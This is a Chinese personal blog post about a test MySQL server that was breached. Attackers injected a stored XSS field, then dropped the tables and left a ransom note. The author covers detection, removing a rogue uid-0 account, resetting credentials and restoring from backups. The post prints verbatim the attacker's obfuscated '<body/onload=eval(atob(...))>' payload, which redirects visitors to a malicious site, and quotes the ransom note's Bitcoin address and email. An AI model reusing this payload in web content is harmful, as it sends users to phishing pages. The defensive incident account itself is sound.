<!DOCTYPE html><html lang="zh-cmn-Hans" prefix="og: http://ogp.me/ns#" class="han-init"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" /><title>运维｜MySQL 数据库被黑，心力交瘁 &mdash; 清风拂33</title><link rel="stylesheet" href="http://localhost:4000/assets/vendor/primer-css/css/primer.css"><link rel="stylesheet" href="http://localhost:4000/assets/css/components/collection.css"><link rel="stylesheet" href="http://localhost:4000/assets/css/components/repo-card.css"><link rel="stylesheet" href="http://localhost:4000/assets/css/sections/repo-list.css"><link rel="stylesheet" href="http://localhost:4000/assets/css/components/boxed-group.css"><link rel="stylesheet" href="http://localhost:4000/assets/css/globals/common.css"><link rel="stylesheet" href="http://localhost:4000/assets/css/globals/responsive.css"><link rel="stylesheet" href="http://localhost:4000/assets/css/posts/index.css"><link rel="stylesheet" href="http://localhost:4000/assets/vendor/octicons/octicons/octicons.css"><link rel="stylesheet" href="https://mazhuang.org/rouge-themes/dist/github.css"><link rel="canonical" href="http://localhost:4000/2023/10/08/what-to-do-after-mysql-been-hacked/"><link rel="alternate" type="application/atom+xml" title="清风拂33" href="http://localhost:4000/feed.xml"><link rel="shortcut icon" href="http://localhost:4000/favicon.ico"><meta property="og:title" content="运维｜MySQL 数据库被黑，心力交瘁"><meta name="keywords" content="Linux, MySQL, Database"><meta name="og:keywords" content="Linux, MySQL, Database"><meta name="description" content="前一阵有一个测试用的 MySQL 数据库被黑了，删库勒索的那种，这里记录一下事情经过，给自己也敲个警钟。"><meta name="og:description" content="前一阵有一个测试用的 MySQL 数据库被黑了，删库勒索的那种，这里记录一下事情经过，给自己也敲个警钟。"><meta property="og:url" content="http://localhost:4000/2023/10/08/what-to-do-after-mysql-been-hacked/"><meta property="og:site_name" content="清风拂33"><meta property="og:type" content="article"><meta property="og:locale" content="zh_CN" /><meta property="article:published_time" content="2023-10-08"> <script src="http://localhost:4000/assets/vendor/jquery/dist/jquery.min.js"></script> <script src="http://localhost:4000/assets/js/main.js"></script></head><body class="" data-mz=""><header class="site-header"><div class="container"><h1><a href="http://localhost:4000/" title="清风拂33"><span class="octicon octicon-mark-github"></span> 清风拂33</a></h1><button class="collapsed mobile-visible" type="button" onclick="toggleMenu();"> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span> </button><nav class="site-header-nav" role="navigation"> <a href="http://localhost:4000/" class="site-header-nav-item" target="" title="首页">首页</a> <a href="http://localhost:4000/categories/" class="site-header-nav-item" target="" title="分类">分类</a> <a href="http://localhost:4000/archives/" class="mobile-hidden site-header-nav-item" target="" title="归档">归档</a> <a href="http://localhost:4000/open-source/" class="mobile-hidden site-header-nav-item" target="" title="开源">开源</a> <a href="http://localhost:4000/fragments/" class="site-header-nav-item" target="" title="片段">片段</a> <a href="http://localhost:4000/wiki/" class="site-header-nav-item" target="" title="维基">维基</a> <a href="http://localhost:4000/links/" class="mobile-hidden site-header-nav-item" target="" title="链接">链接</a> <a href="http://localhost:4000/about/" class="site-header-nav-item" target="" title="关于">关于</a> <a class="mobile-hidden" href="http://localhost:4000/feed.xml"><span class="octicon octicon-rss" style="color:orange;"></span></a></nav></div></header><section class="collection-head small geopattern" data-pattern-id="运维｜MySQL 数据库被黑，"><div class="container"><div class="columns"><div class="column three-fourths"><div class="collection-title"><h1 class="collection-header">运维｜MySQL 数据库被黑，心力交瘁</h1><div class="collection-info"> <span class="meta-info"> <span class="octicon octicon-calendar"></span> 2023/10/08 </span> <span class="meta-info"> <span class="octicon octicon-file-directory"></span> <a href="http://localhost:4000/categories/#Linux" title="Linux">Linux</a> </span> <span class="meta-info"> <span class="octicon octicon-file-directory"></span> <a href="http://localhost:4000/categories/#Database" title="Database">Database</a> </span> <span class="meta-info"> <span class="octicon octicon-clock"></span> 共 2125 字，约 7 分钟 </span></div></div></div><div class="column one-fourth mobile-hidden"><div class="collection-title"> <img style="height:72px;width:72px" src="http://localhost:4000/assets/images/qrcode.jpg" alt="请显示我吖" /></div></div></div></div></section><section class="container content"><div class="columns"><div class="column three-fourths" ><article class="article-content markdown-body"><p>前一阵有一个测试用的 MySQL 数据库被黑了，删库勒索的那种，这里记录一下事情经过，给自己也敲个警钟。</p><h2 id="0x00-发现端倪">0x00 发现端倪</h2><p>有一天，我在自测功能的时候，发现 APP 里展示的每条详情信息里都有一段乱码，只是有点奇怪，没有特别在意，后来调试网页的时候看到控制台有个报错，就顺手看了一眼，发现详情网页里有这样的东西：</p><p><img src="http://localhost:4000/images/posts/database/body-onload.png" alt="body-onload" /></p><p>找我的前端小伙伴讨论了下，最后本地调试了一番，发现是数据库里有个字段齐刷刷地被改成这个了：</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;body/onload=eval(atob("d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoImh0dHBzOi8vaHpyMGRtMjhtMTdjLmNvbS9lYm1zczBqcTc/a2V5PWM5MGEzMzYzMDEzYzVmY2FhZjhiZjVhOWE0ZTQwODZhIik="))&gt;
</code></pre></div></div><p>atob 里面这一串是被 Base64 编码的 <code class="language-plaintext highlighter-rouge">window.location.replace("https://xxx.com/xxx")</code>，所以这段代码如果在网页里被正常加载，网页会被自动重定向到一个邪恶的网址：</p><p><img src="http://localhost:4000/images/posts/database/fake-security-tips.png" alt="fake-security-tips" /></p><p>是不是挺可怕？浏览网页的人如果警惕性不高，可能就中招了。这时我明白过来，我的测试环境这是被当成肉鸡了……</p><p>不过当时还是大意了，因为暂时没有想通它是怎样攻击和篡改，以为就是从页面注入的，就在逻辑里加了一些防护逻辑，把这个字段值都改回去然后就继续干活了。</p><h2 id="0x01-库没人懵">0x01 库没人懵</h2><p>到第二天，正欢乐地测着功能呢，突然打开啥页面都报数据库异常了，到库里一看，好家伙，所有表都没了，只剩一张 readme，里面写着：</p><blockquote><p>以下数据库已被删除：xxx。 我们有完整的备份。 要恢复它，您必须向我们的比特币地址bc1q8erv6l4xrdqsfpwp92gm0mccur49pqn8l8epfg支付0.016比特币（BTC）。 如果您需要证明，请通过以下电子邮件与我们联系。 song4372@proton.me 。 任何与付款无关的邮件都将被忽略！</p></blockquote><p>事情没我想象的简单！能把库里的表都删了，数据库和服务器的权限怕是都被拿到了。</p><p>仔细回想了前一段时间里发生的事情，推测过程可能是这样的：</p><ul><li>最开始，有一天接收到阿里云的告警，提示 AK 泄漏，查看事件日志发现利用 AK 创建了一个 RAM 子账号，并赋予了高权限，当时我禁用了涉及的 AK，删除了被创建的子账号，但服务器应该已经被渗透了；</li><li>然后就是数据库字段被篡改，估计是一方面把服务器资源作为肉鸡继续扩散攻击其它人，另一方面作为诱饵，监控处理动作；</li><li>最后就是删库勒索了。</li></ul><h2 id="0x02-夺回权限">0x02 夺回权限</h2><p>当务之急，是夺回权限，恢复数据。整个服务器和数据库的权限应该都不安全了，所以我先采取了以下措施：</p><ul><li>检查服务器安全组规则，发现被加入了允许公网访问 3306 和所有端口的记录，将其删除；</li><li>检查服务器上的用户，发现多了一个用户 <code class="language-plaintext highlighter-rouge">guest</code>，uid 0，将其禁用；</li><li>检查进程，发现有用 <code class="language-plaintext highlighter-rouge">guest</code> 用户启动的 bash 进程和 mysql root 用户进程，将其 kill 掉；</li><li>修改服务器所有用户密码，检查用户权限；</li><li>修改数据库端口、重置所有用户和密码，只赋予用户必要权限；</li><li>更新服务器，修复已知安全漏洞；</li></ul><p>用到的主要指令：</p><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 检查 Linux 服务器上的用户</span>
<span class="nb">cat</span> /etc/passwd

<span class="c"># 修改用户密码</span>
passwd &lt;username&gt;

<span class="c"># 检查进程</span>
ps <span class="nt">-ef</span> 

<span class="c"># 杀掉进程</span>
<span class="nb">kill</span> <span class="nt">-9</span> &lt;pid&gt;

<span class="c"># 修改数据库端口</span>
vim /etc/my.cnf

<span class="c"># mysql 删除用户，在 mysql 命令行执行</span>
drop user <span class="s1">'&lt;user_name&gt;'</span>@<span class="s1">'&lt;scope&gt;'</span><span class="p">;</span>
<span class="c"># mysql 创建用户，赋予权限，在 mysql 命令行执行</span>
create user <span class="s1">'&lt;user_name&gt;'</span>@<span class="s1">'&lt;scope&gt;'</span> IDENTIFIED BY <span class="s1">'&lt;password&gt;'</span><span class="p">;</span>
grant <span class="k">select</span>,insert,update,delete on <span class="s1">'&lt;database_name&gt;'</span>.<span class="k">*</span> to <span class="s1">'&lt;user_name&gt;'</span>@<span class="s1">'&lt;scope&gt;'</span><span class="p">;</span>
</code></pre></div></div><h2 id="0x03-修复数据">0x03 修复数据</h2><p>接下来就是修复数据了。</p><p>这个测试用的 MySQL 实例开启了 binlog，可惜被攻击者清除了，所以只能从备份恢复了。数据用定时任务 + mysqldump，每天备份一次，找到合适的备份，恢复数据。</p><p><em>ps: 幸亏有备份，不然真是欲哭无泪了。</em></p><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 解压备份文件</span>
<span class="nb">gunzip</span> <span class="nt">-c</span> xxx.sql.gz <span class="o">&gt;</span> xxx.sql

<span class="c"># 恢复数据，在 mysql 命令行执行</span>
use &lt;database_name&gt;<span class="p">;</span>
souce /path/to/xxx.sql<span class="p">;</span>
</code></pre></div></div><h2 id="0x04-小结">0x04 小结</h2><p>以上的步骤的操作过程，远没有看起来那么简单，实际耗费了我挺长时间。</p><p>这次事件让我深刻地意识到，安全问题不容忽视，不管是服务器还是数据库，都要做好安全措施，不要给攻击者可乘之机。不然真到了被攻击，而又自行恢复无望的时候，那就叫天天不应，叫地地不灵了。退一万步说，即使有备份，也会耗费大量的时间和精力，影响正常的工作和生活。</p><p>安全任重道远，后续先做好以下方面：</p><ul><li>访问控制，只赋予必要权限；</li><li>服务器镜像、数据库定期备份；</li><li>定期漏洞扫描与修复；</li><li>敏感数据加密；</li><li>操作审计；</li></ul><p>最后，<strong>警钟常鸣！</strong></p><div style="margin-top:2em;padding:0 1.5em;border:1px solid #d3d3d3;background-color:#deebf7"><h3>文档信息</h3><ul><li>本文作者：<a href="http://localhost:4000" target="_blank">清风拂33</a></li><li>本文链接：<a href="http://localhost:4000/2023/10/08/what-to-do-after-mysql-been-hacked/" target="_blank">http://localhost:4000/2023/10/08/what-to-do-after-mysql-been-hacked/</a></li><li>版权声明：自由转载-非商用-非衍生-保持署名（<a href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.zh" target="_blank">创意共享3.0许可证</a>）</li></ul></div></article><div class="share"></div><div class="comment"> <script src="https://giscus.app/client.js" data-repo="mzlogin/blog-comments" data-repo-id="MDEwOlJlcG9zaXRvcnk5MzEyNzkxNw==" data-category="Announcements" data-category-id="DIC_kwDOBY0E7c4CRtg9" data-mapping="title" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="light" data-lang="zh-CN" data-loading="lazy" crossorigin="anonymous" async> </script></div></div><div class="column one-fourth"><h3>Search</h3><div id="site_search"> <input style="width:96%" type="text" id="search_box" placeholder="Search"></div><ul id="search_results" style="font-size:14px;list-style-type:none;padding-top:10px;padding-left:10px;"></ul><script src="http://localhost:4000/assets/js/simple-jekyll-search.min.js"></script> <script type="text/javascript"> SimpleJekyllSearch({ searchInput: document.getElementById('search_box'), resultsContainer: document.getElementById('search_results'), json: 'http://localhost:4000/assets/search_data.json?v=1710481417', searchResultTemplate: '<li><a href="{url}" title="{title}">{title}</a></li>', noResultsText: 'No results found', limit: 10, fuzzy: false, exclude: ['Welcome'] }) </script><h3 class="post-directory-title mobile-hidden">Table of Contents</h3><div id="post-directory-module" class="mobile-hidden"><section class="post-directory"><dl></dl></section></div><script src="http://localhost:4000/assets/js/jquery.toc.js"></script></div></div></section><footer class="container"><div class="site-footer" role="contentinfo"><div class="copyright left mobile-block"> © 2024 <span title="清风拂33">清风拂33</span> <a href="javascript:window.scrollTo(0,0)" class="right mobile-visible">TOP</a></div><ul class="site-footer-links right mobile-hidden"><li> <a href="javascript:window.scrollTo(0,0)" >TOP</a></li></ul><a href="https://github.com/littlekj/littlekj.github.io" target="_blank" aria-label="view source code"> <span class="mega-octicon octicon-mark-github" title="GitHub"></span> </a><ul class="site-footer-links mobile-hidden"><li> <a href="http://localhost:4000/" title="首页" target="">首页</a></li><li> <a href="http://localhost:4000/categories/" title="分类" target="">分类</a></li><li> <a href="http://localhost:4000/archives/" title="归档" target="">归档</a></li><li> <a href="http://localhost:4000/open-source/" title="开源" target="">开源</a></li><li> <a href="http://localhost:4000/fragments/" title="片段" target="">片段</a></li><li> <a href="http://localhost:4000/wiki/" title="维基" target="">维基</a></li><li> <a href="http://localhost:4000/links/" title="链接" target="">链接</a></li><li> <a href="http://localhost:4000/about/" title="关于" target="">关于</a></li><li><a href="http://localhost:4000/feed.xml"><span class="octicon octicon-rss" style="color:orange;"></span></a></li></ul></div></footer><div class="tools-wrapper"> <a class="gotop" href="#" title="回到顶部"><span class="octicon octicon-arrow-up"></span></a></div><script src="http://localhost:4000/assets/js/geopattern.js"></script> <script> jQuery(document).ready(function($) { $('.geopattern').each(function(){ $(this).geopattern($(this).data('pattern-id')); }); /* hljs.initHighlightingOnLoad(); */ }); </script></body></html>
